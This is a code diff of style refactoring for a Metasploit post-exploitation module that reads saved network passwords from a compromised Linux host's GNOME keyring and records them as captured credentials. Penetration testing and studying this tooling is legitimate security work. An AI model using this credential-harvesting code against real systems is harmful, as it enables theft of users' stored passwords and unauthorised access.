@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Post
   end
 
   def init_railgun_defs
-    unless session.railgun.libraries.has_key?('libgnome_keyring')
+    unless session.railgun.libraries.key?('libgnome_keyring')
       session.railgun.add_library('libgnome_keyring', 'libgnome-keyring.so.0')
     end
     session.railgun.add_function(
@@ -127,9 +127,10 @@ class MetasploitModule < Msf::Post
 
   def get_string(address, chunk_size = 64, max_size = 256)
     data = ''
-    begin
+    loop do
       data << session.railgun.memread(address + data.length, chunk_size)
-    end until data.include?("\x00") or data.length >= max_size
+      break if data.include?("\x00") || (data.length >= max_size)
+    end
 
     if data.include?("\x00")
       idx = data.index("\x00")
@@ -161,7 +162,7 @@ class MetasploitModule < Msf::Post
     }
 
     credential_data = {
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -171,7 +172,7 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -206,7 +207,7 @@ class MetasploitModule < Msf::Post
     @hostname_cache = {}
     libgnome_keyring = session.railgun.libgnome_keyring
 
-    unless libgnome_keyring.gnome_keyring_is_available()['return']
+    unless libgnome_keyring.gnome_keyring_is_available['return']
       fail_with(Failure::NoTarget, 'libgnome-keyring is unavailable')
     end
 
@@ -224,12 +225,12 @@ class MetasploitModule < Msf::Post
     list_anchor = result['results'].unpack(session.native_arch == ARCH_X64 ? 'Q' : 'L')[0]
     fail_with(Failure::NoTarget, 'Did not receive a list of passwords') if list_anchor == 0
 
-    entry = { :next_ptr => list_anchor }
-    begin
+    entry = { next_ptr: list_anchor }
+    loop do
       entry = get_list_entry(entry[:next_ptr])
       pw_data = entry[:data]
       # resolve necessary string fields to non-empty strings or nil
-      [:server, :user, :domain, :password, :protocol].each do |field|
+      %i[server user domain password protocol].each do |field|
         value = pw_data[field]
         pw_data[field] = nil
         next if value == 0
@@ -241,7 +242,7 @@ class MetasploitModule < Msf::Post
       end
 
       # skip the entry if we don't at least have a username and password
-      next if pw_data[:user].nil? or pw_data[:password].nil?
+      next if pw_data[:user].nil? || pw_data[:password].nil?
 
       printable = ''
       printable << "#{pw_data[:protocol]}://" unless pw_data[:protocol].nil?
@@ -253,7 +254,7 @@ class MetasploitModule < Msf::Post
       end
       print_good(printable)
 
-      pw_data[:port] = resolve_port(pw_data[:protocol]) if pw_data[:port] == 0 and !pw_data[:protocol].nil?
+      pw_data[:port] = resolve_port(pw_data[:protocol]) if (pw_data[:port] == 0) && !pw_data[:protocol].nil?
       next if pw_data[:port] == 0  # can't report without a valid port
 
       ip_address = resolve_host(pw_data[:server])
@@ -267,7 +268,8 @@ class MetasploitModule < Msf::Post
         username: pw_data[:user],
         password: pw_data[:password]
       )
-    end while entry[:next_ptr] != list_anchor and entry[:next_ptr] != 0
+      break unless (entry[:next_ptr] != list_anchor) && (entry[:next_ptr] != 0)
+    end
 
     libgnome_keyring.gnome_keyring_network_password_list_free(list_anchor)
   end
